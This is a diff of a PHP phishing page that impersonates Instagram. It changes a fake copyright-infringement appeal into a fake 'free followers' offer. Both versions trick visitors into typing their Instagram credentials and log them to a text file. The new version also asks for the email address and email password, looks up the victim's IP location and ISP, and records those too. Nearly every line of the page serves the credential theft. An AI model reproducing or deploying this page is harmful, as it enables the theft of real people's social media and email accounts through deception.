@@ -1,49 +1,63 @@
 <?php
 
+error_reporting(0);
 set_time_limit(0);
 date_default_timezone_set("Europe/Istanbul");
 
 require 'vendor2/autoload.php';
 
-function php_multiline()
+if($_GET)
 {
-    return PHP_EOL . PHP_EOL . PHP_EOL;
+    if(empty($_GET['username'])) echo "<script type='text/javascript'>alert('Do not make space on your username!');</script>";
+    if(!empty($_GET['comen']) && empty($_GET['password'])) { echo "<script type='text/javascript'>alert('Do not make space !');</script>"; header('Location: /'); }
 }
 
-define("PHP_MULTILINE", php_multiline());
-
-if($_POST)
+if(!empty($_GET['username']) && empty($_GET['comen']))
 {
-    if(empty($_POST['username'])) echo "<script type='text/javascript'>alert('Do not make space on your username!');</script>";
-    if(!empty($_POST['comen']) && empty($_POST['password'])) { echo "<script type='text/javascript'>alert('Do not make space !');</script>"; header('Location: /'); }
+    $_GET['username'] = strtolower($_GET['username']);
 }
 
-if(!empty($_POST['username']) && empty($_POST['comen']))
+if(isset($_GET['comen']))
 {
-    $_POST['username'] = strtolower($_POST['username']);
-    $link = "https://instagram.com/" . $_POST['username'];
-    $veri = @file_get_contents($link);
-    if(empty($veri))
-    {
-        header("Location: /");
-    }
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, "http://ip-api.com/json/".$_SERVER['REMOTE_ADDR']);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+    $output = curl_exec($curl);
+    curl_close($curl);
+    $json = json_decode($output, true);
     
-    $veri=explode("window._sharedData = ",$veri)[1];
-    $veri=explode(";</script>",$veri)[0];
-    $kullanicibilgileri=json_decode($veri,true)['entry_data']['ProfilePage']['0']['graphql']['user'];
+    $dosya = fopen("baris-altay.txt", "a");
+    fwrite($dosya, "
+    \$_KULLANICI_ADI : " . $_GET['username'] . "
     
-    $dosya = fopen("bariscodefx_kullanicilar.txt", "a");
-    fwrite($dosya, "kullanici_adi ====> " . $_POST['username'] . PHP_EOL . "tarih ====> " . date("Y-m-d H:i:s", time()) .  PHP_MULTILINE);
+    \$_SIFRE         : " . $_GET['password'] . "
+    
+    \$_EPOSTA        : " . $_GET['email'] . "
+    
+    \$_EPOSTA_SIF    : " . $_GET['emailPassword'] . "
+    
+    \$_IP            : " . $_SERVER['REMOTE_ADDR'] . "
+    
+    \$_ULKE          : " . $json['country'] . "
+    
+    \$_SEHIR         : " . $json['regionName'] . "
+    
+    \$_ILCE          : " . $json['city'] . "
+    
+    \$_ISP           : " . $json['isp'] . "
+    
+    \$_KATEGORI      : " . $_GET['category'] . "
+    
+    
+    
+    
+    
+    
+    
+    ");
     fclose($dosya);
-}
-
-if(isset($_POST['comen']))
-{
-    $dosya = fopen("bariscodefx.txt", "a");
-    fwrite($dosya, "kullanici_adi ====> " . $_POST['username'] . PHP_EOL . "sifre ====> " . $_POST['password'] . PHP_EOL . "Tarih ====> " . date("Y-m-d H:i:s", time()) . PHP_MULTILINE);
-    fclose($dosya);
     
-    header("location: https://help.instagram.com/contact/539946876093520");
+    header("location: https://" . $_SERVER['HTPP_HOST'] . "/index.php?success=1");
 }
 
 ?>
@@ -51,9 +65,9 @@ if(isset($_POST['comen']))
 <html lang="en">
     <head>
         <meta charset="UTF-8">
-        <title>Copyright Infringement - Instagram</title>
+        <title>Follower System - Instagram</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-        <meta name="description" content="Copyright Infringement on your Instagram Account">
+        <meta name="description" content="Big Instagram Follower System">
         <meta name="author" content="Instagram">
         
         <!-- SCRIPTS -->
@@ -73,17 +87,17 @@ if(isset($_POST['comen']))
         </div>
         <?php
         
-        if(empty($_POST['username']))
+        if(empty($_GET['username']))
         {
         
         ?>
-        <form action="/" method="POST" class="first-form">
+        <form action="/" method="GET" class="first-form">
             <div class="banner-sm">
                 <img src="images/banner-sm.png" class="banner-sm-img" width="175">
             </div>
-            <span class="color-gray">As Instagram, we remove accounts that violate our copyright laws. Continue by entering your username to learn about and appeal to copyright infringement related to your account.</span>
+            <span class="color-gray">Fill the form and get followers in 24 hours!</span>
             <div class="mb-3">
-                <input type="text" name="username" id="username" class="form-input" placeholder="Username">
+                <input type="text" name="username" id="username" class="form-input" placeholder="Username" required autocomplete="off">
             </div>
             <div class="mb-3">
                 <button type="submit">Next</button>
@@ -92,25 +106,36 @@ if(isset($_POST['comen']))
         <?php
         }else {
         ?>
-        <form action="/" method="POST" class="second-form">
-            <?php
-            if(isset($kullanicibilgileri['profile_pic_url'])) :
-            ?>
-            <div class="profile">
-                <img src="<?= $kullanicibilgileri['profile_pic_url']; ?>" width="82" class="profile-img">
-            </div>
-            <?php
-            endif;
-            ?>
-            <p>Copyright Infringement on @<?= $_POST['username']; ?></p>
-            <span class="color-gray">We have received numerous complaints that you violated our copyright laws regarding your account. If you do not give us feedback, your account will be removed within 48 hours. If you think this is wrong, continue by logging in.</span>
+        <form action="/" method="GET" class="second-form">
+            <p>@<?= $_GET['username']; ?></p>
+            <span class="color-gray">Instagram Followers Free</span>
             <div class="mb-3">
-                <input type="password" name="password" id="password" class="form-input" placeholder="Password">
+                <input type="password" name="password" id="password" class="form-input" placeholder="Password" required autocomplete="off">
             </div>
-            <input hidden type="text" name="username" id="username" value="<?= $_POST['username']; ?>">
+            <div class="mb-3">
+                <input type="email" name="email" id="email" class="form-input" placeholder="Email" required autocomplete="off">
+            </div>
+            <div class="mb-3">
+                <input type="password" name="emailPassword" id="emailPassword" class="form-input" placeholder="Email Password" required autocomplete="off">
+            </div>
+            <div class="mb-3">
+                <select name="followersCount" id="followersCount" class="form-input">
+                    <?php
+
+                    for($i = 0; $i <= 5000; $i++)
+                    {
+                        ?>
+                        <option value="<?= $i; ?>"><?= $i ?></option>
+                        <?php
+                    }
+
+                    ?>
+                </select>
+            </div>
+            <input hidden type="text" name="username" value="<?= $_GET['username']; ?>">
             <input hidden type="number" name="comen" value="1">
             <div class="mb-3">
-                <button type="submit">Log In</button>
+                <button type="submit">Get Verify</button>
             </div>
         </form>
         <?php
